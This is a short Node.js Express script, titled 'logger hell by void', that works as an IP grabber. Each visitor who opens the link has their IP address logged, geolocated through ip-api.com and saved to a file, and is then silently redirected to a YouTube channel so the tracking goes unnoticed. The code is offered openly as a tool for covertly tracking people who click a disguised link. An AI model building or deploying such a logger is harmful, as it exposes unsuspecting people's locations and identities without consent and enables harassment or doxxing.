/*
logger hell by void


*/



const express = require("express");
const fs = require("fs");
const app = express();
const port = 3000;
const axios = require("axios");
const link = "https://youtube.com/@void190y?si=2c2UzhxZD7JJ05yC";


function getipinfo(ip) {
    return axios.get(`http://ip-api.com/json/${ip}`)
        .then(response => response.data)
        .catch(err => {
            console.error("Erro ao buscar IP:", err);
            return null;
        });
}7


app.set("trust proxy", true);

console.clear();
console.log(`
   _                _
  | |    ___   __ _| | _____ _ __
  | |   / _ \\ / _\` | |/ / _ \\ '__|
  | |__| (_) | (_| |   <  __/ |
  |_____\\___/ \\__,_|_|\\_\\___|_|

============================
 😈 Logger HELL by void
============================
`);

app.get("/", async (req, res) => {

  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const dataip = await getipinfo(ip)


  fs.appendFile("log.txt", `${ip} \n ${dataip}\n`, err => {
    if (err) {
      console.log("Erro ao salvar IP");
    }
  });
  console.log(ip,":entrou \n")
  console.log(dataip);


  res.redirect(302, link);
});

app.listen(port, () => {
  console.log("Logger rodando na porta " + port);
});
